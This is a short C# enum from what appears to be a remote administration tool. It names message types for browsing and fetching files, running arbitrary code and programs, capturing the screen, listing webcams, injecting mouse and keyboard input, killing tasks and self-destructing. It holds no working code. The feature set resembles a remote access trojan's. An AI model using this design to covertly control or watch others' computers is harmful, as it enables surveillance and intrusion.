namespace JPB.RemoteAdmin.Common.Messages
{
    public enum InfoState
    {
        OnIpChanged,

        OnFsExplore,
        OnFileGet,
        SearchRequest,

        OnDynamicCodeExecute,
        OnDynamicProgramExecute,
        OnDynamicProgramExecuteResult,

        OnStartScreenCapture,
        OnEndScreenCapture,
        OnScreenCaptureResult,
        GetWebcamsRequest,
        OnMouseClick,
        OnKeybordInput,

        RequstInitalId,
        OnException,
        OnKeybordInputRequest,
        OnFileOpProgramExecute,
        OnFileOpProgramDelete,

        GetTaskList,
        KillTask,

        OnMessageBoxRequest,
        Reconnect,
        Restart,
        SelfDestruct
    }
}
